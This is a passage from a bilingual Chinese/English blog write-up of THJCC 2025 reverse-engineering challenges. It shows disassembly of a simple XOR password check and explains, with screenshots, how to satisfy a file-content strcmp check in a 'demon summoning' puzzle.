</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="mh">0x555555555060</span><span class="p">:</span>      <span class="n">endbr64</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555064</span><span class="p">:</span>      <span class="n">push</span>   <span class="n">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555065</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555068</span><span class="p">:</span>      <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555506c</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="p">:</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555075</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">],</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555079</span><span class="p">:</span>      <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555507b</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555083</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555508b</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555508f</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xf6a</span><span class="p">]</span>        <span class="c1"># 0x555555556000</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555096</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555099</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555509e</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555030</span> <span class="o">&lt;</span><span class="n">printf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550a3</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550a7</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550aa</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xf5b</span><span class="p">]</span>        <span class="c1"># 0x55555555600c</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550b1</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550b4</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550b9</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555040</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550be</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">],</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550c5</span><span class="p">:</span>      <span class="n">jmp</span>    <span class="mh">0x555555555107</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550c7</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550ca</span><span class="p">:</span>      <span class="n">cdqe</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550cc</span><span class="p">:</span>      <span class="n">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550d1</span><span class="p">:</span>      <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xffffffab</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550d4</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550d6</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550d9</span><span class="p">:</span>      <span class="n">cdqe</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550db</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rdx</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2f1e</span><span class="p">]</span>        <span class="c1"># 0x555555558000</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550e2</span><span class="p">:</span>      <span class="n">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rdx</span><span class="o">*</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550e6</span><span class="p">:</span>      <span class="n">cmp</span>    <span class="n">cl</span><span class="p">,</span><span class="n">al</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550e8</span><span class="p">:</span>      <span class="n">je</span>     <span class="mh">0x555555555103</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550ea</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xf20</span><span class="p">]</span>        <span class="c1"># 0x555555556011</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550f1</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550f4</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555010</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550f9</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x5555555550fe</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555050</span> <span class="o">&lt;</span><span class="n">exit</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555103</span><span class="p">:</span>      <span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">],</span><span class="mh">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555107</span><span class="p">:</span>      <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">],</span><span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555510b</span><span class="p">:</span>      <span class="n">jle</span>    <span class="mh">0x5555555550c7</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555510d</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xf04</span><span class="p">]</span>        <span class="c1"># 0x555555556018</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555114</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555117</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555010</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555511c</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">],</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555123</span><span class="p">:</span>      <span class="n">jmp</span>    <span class="mh">0x55555555515f</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555125</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555128</span><span class="p">:</span>      <span class="n">cdqe</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555512a</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rdx</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2eef</span><span class="p">]</span>        <span class="c1"># 0x555555558020</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555131</span><span class="p">:</span>      <span class="n">movzx</span>  <span class="n">ecx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rdx</span><span class="o">*</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555135</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555138</span><span class="p">:</span>      <span class="n">cdq</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555139</span><span class="p">:</span>      <span class="n">shr</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x1c</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555513c</span><span class="p">:</span>      <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555513e</span><span class="p">:</span>      <span class="ow">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555141</span><span class="p">:</span>      <span class="n">sub</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555143</span><span class="p">:</span>      <span class="n">cdqe</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555145</span><span class="p">:</span>      <span class="n">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555514a</span><span class="p">:</span>      <span class="n">xor</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555514c</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555514f</span><span class="p">:</span>      <span class="n">cdqe</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555151</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rdx</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2ec8</span><span class="p">]</span>        <span class="c1"># 0x555555558020</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555158</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rdx</span><span class="o">*</span><span class="mi">1</span><span class="p">],</span><span class="n">cl</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555515b</span><span class="p">:</span>      <span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">],</span><span class="mh">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555515f</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555162</span><span class="p">:</span>      <span class="n">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x24</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555165</span><span class="p">:</span>      <span class="n">jbe</span>    <span class="mh">0x555555555125</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555167</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2eb2</span><span class="p">]</span>        <span class="c1"># 0x555555558020</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555516e</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555171</span><span class="p">:</span>      <span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xea9</span><span class="p">]</span>        <span class="c1"># 0x555555556021</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555178</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555517b</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555180</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555030</span> <span class="o">&lt;</span><span class="n">printf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555185</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555518a</span><span class="p">:</span>      <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555518e</span><span class="p">:</span>      <span class="n">sub</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="p">:</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555197</span><span class="p">:</span>      <span class="n">je</span>     <span class="mh">0x55555555519e</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555555199</span><span class="p">:</span>      <span class="n">call</span>   <span class="mh">0x555555555020</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555519e</span><span class="p">:</span>      <span class="n">leave</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555519f</span><span class="p">:</span>      <span class="n">ret</span>
</span></span></code></pre></div><p>讀一下asm很快就能得到password了<br>
Reading the assembly code will quickly reveal the password.</p>


<h3 class="relative group">demon summoning 
    <div id="demon-summoning" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#demon-summoning" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-15.png"
        alt="alt text"
      />
      
    </figure>


    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-17.png"
        alt="alt text"
      />
      
    </figure>
</p>
<p>先照著檔案開啟的步驟擺放檔案<br>
Follow the steps from the file to place the files accordingly.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-18.png"
        alt="alt text"
      />
      
    </figure>

這邊回傳了一個strcmp<br>
我們希望lpBuffer == Str2<br>
This returns a <code>strcmp</code> function.<br>
We want <code>lpBuffer == Str2</code>.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-19.png"
        alt="alt text"
      />
      
    </figure>


    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-20.png"
        alt="alt text"
      />
      
    </figure>


    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-21.png"
        alt="alt text"
      />
      
    </figure>

<code>Melon_Bun</code>這個檔案的內容要是<code>Satania's favorite</code><br>
The content of the <code>Melon_Bun</code> file should be <code>Satania's favorite</code>.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-22.png"
        alt="alt text"
      />
      
    </figure>

應該可以預期招喚成功<br>
It should be expected that the summoning will succeed.

    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-23.png"
        alt="alt text"
      />
      
    </figure>


    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/demon.png"
        alt="alt text"
      />
      
    </figure>
</p>

          
          
          
        </div>
        
        

        
        

          
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\\THJCC 2025\\index.md"
        var oid_likes = "likes_posts\\THJCC 2025\\index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/thjcc-2024-winter/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >THJCC 2024 winter 出題心得</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-12-18 00:00:00 &#43;0000 UTC">2024-12-18</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      &copy;
      2025
      hokak
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
  
</body>


</html>
